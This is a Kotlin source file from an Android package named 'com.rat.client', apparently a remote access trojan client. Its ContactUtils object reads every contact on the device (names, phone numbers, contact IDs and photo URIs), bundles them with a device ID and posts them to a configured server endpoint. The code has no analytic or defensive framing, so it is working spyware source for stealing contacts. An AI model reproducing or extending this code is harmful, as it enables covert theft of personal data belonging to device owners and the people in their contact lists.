package com.rat.client.utils

import android.Manifest
import android.content.Context
import android.provider.ContactsContract
import android.util.Log
import com.rat.client.Config
import org.json.JSONArray
import org.json.JSONObject

/**
 * Reads contacts from the device.
 */
object ContactUtils {
    private const val TAG = "ContactUtils"

    fun getAllContacts(context: Context) {
        if (!PermissionManager.hasPermissions(context, arrayOf(Manifest.permission.READ_CONTACTS))) {
            Log.w(TAG, "Contacts permission not granted")
            return
        }

        try {
            val contacts = JSONArray()

            // Query raw contacts
            val contactCursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.PHOTO_URI,
                ),
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )

            contactCursor?.use { c ->
                val nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                val idIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
                val photoIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_URI)

                while (c.moveToNext()) {
                    val contact = JSONObject()
                    contact.put("name", if (nameIdx >= 0) c.getString(nameIdx) ?: "" else "")
                    contact.put("number", if (numberIdx >= 0) c.getString(numberIdx) ?: "" else "")
                    contact.put("rawContactId", if (idIdx >= 0) c.getString(idIdx) ?: "" else "")
                    contact.put("photoUri", if (photoIdx >= 0) c.getString(photoIdx) ?: "" else "")
                    contact.put("email", "")

                    contacts.put(contact)
                }
            }

            if (contacts.length() > 0) {
                val payload = JSONObject()
                payload.put("deviceId", DeviceInfoUtils.getDeviceId(context))
                payload.put("contacts", contacts)

                ApiClient.post(Config.Api.CONTACTS, payload)
                Log.d(TAG, "Sent ${contacts.length()} contacts")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Contacts error: ${e.message}")
        }
    }
}

